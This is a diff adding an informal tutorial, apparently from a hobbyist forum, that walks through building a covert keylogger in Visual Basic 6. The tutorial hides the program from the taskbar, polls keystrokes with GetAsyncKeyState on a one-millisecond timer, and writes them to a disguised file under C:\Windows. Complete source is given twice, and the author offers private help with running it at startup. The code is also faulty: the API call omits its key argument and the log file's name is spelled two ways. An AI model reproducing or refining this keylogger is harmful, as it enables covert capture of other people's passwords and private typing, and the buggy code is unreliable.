@@ -1,0 +1,197 @@
+Ok...I am assuming that you have a basic understanding as to how visual basic works and how to make programs, debug, and compile. If not, email me and I might be able to help.
+
+First, if you don't have it, get it. ApiGuide. Download it at http://www.mentalis.org/agnet/apiguide.shtml
+
+Ok. Open VB and start a new application. Add to the form a button, a timer, and a module(I know the module isn't actually part of the form). Thats all. Change there caption of the button to Start Logging
+(if you want to make it start on startup...pm me or email me)
+Now using api guide or just copying from here, declare a new function. the GetASyncKeyState function
+
+
+
+Declare Function GetAsyncKeyState Lib "user32" Alias "GetAsyncKeyState"
+
+(ByVal vKey As Long) As Integer
+
+
+^---put this in the declarations section of the module.
+
+That is all one line of code. Make sure its like that. and not split in 2.
+
+Now you have a new function to use through your program.
+ok...
+now we must make it be "invisible". Now im sorry but in Windows XP, i do not know how to remove it from the "processes" section of the Task Manager. But Other than that...its invisible.
+
+OK. In the button code..., in the click event of course...
+type the following
+
+
+
+app.taskvisible = false
+
+form1.visible = false
+
+form1.hide
+
+timer1.enabled = true
+
+
+
+
+
+'and also in the properties section of the form...change the shownintaskbar to false
+
+
+Now when we click the button...it goes invisible.
+
+Now we are going to need some variables....
+Back in the declarations section declare the following...
+
+
+
+Dim strLetter as String, strTotal as String
+
+
+Now in the timer code put this. Ill explain afterward.
+also set the interval to 1 and enabled to false
+
+
+
+Private Sub Timer1_Timer()
+
+
+
+For I = 28 To 128
+
+
+
+If GetAsyncKeyState <> 0 Then
+
+
+
+strLetter = Chr(I)
+
+
+
+
+
+'Now here you can add certain things
+
+'so that instead of displaying
+
+'retarded characters, it tells you
+
+'what the user pressed. What I mean
+
+'is if they press Enter/Return, it will
+
+'Show some weird box. You dont want that
+
+'so u make a select case about I for each
+
+'button u want to customize. PM me or Email
+
+'me for help on this part.
+
+
+
+
+
+strTotal = strTotal & strLetter
+
+
+
+
+
+End If
+
+
+
+Next I
+
+
+
+open "C:\Windows\SysResources.DAT" for output as #1
+
+Print #1, strTotal
+
+close #1
+
+
+
+End Sub
+
+
+
+
+
+'End Code
+
+
+Now all you have to do is when you want to check the keys pressed, open up C:\Windows\SysResource.DAT in notepad, and there it is. This program will not run on start up. If you want to know how to do that, PM me, but preferably email me. I would much rather have you add me to Msn Messenger. My email for messenger is... Black_viper_13@hotmail.com
+My email for emailing is..... Anarchist_ninja_thief@hotmail.com.
+
+Hope this helps!
+Here is the entire coding for the lamers...
+
+
+
+'BEGINNING
+
+
+
+Dim strLetter As String, strTotal As String, old as string
+
+
+
+Private Sub Command1_Click()
+
+Timer1.Enabled = True
+
+End Sub
+
+
+
+Private Sub Form_Load()
+
+Command1.Caption = "Start Loggin"
+
+Timer1.Enabled = False
+
+Timer1.Interval = 1
+
+End Sub
+
+
+
+Private Sub Timer1_Timer()
+
+For I = 28 To 128 'ASCII code
+
+If GetAsyncKeyState <> 0 Then
+
+strLetter = Chr(I)
+
+End If
+
+If strletter <> Old Then
+
+Old = strletter
+
+strTotal = strTotal & old
+
+End If
+
+Next I
+
+Open "C:\windows\SysResources.dat" For Output As #1
+
+Print #1, strTotal
+
+Close #1
+
+End Sub
+
+
+
+'ENDING
+
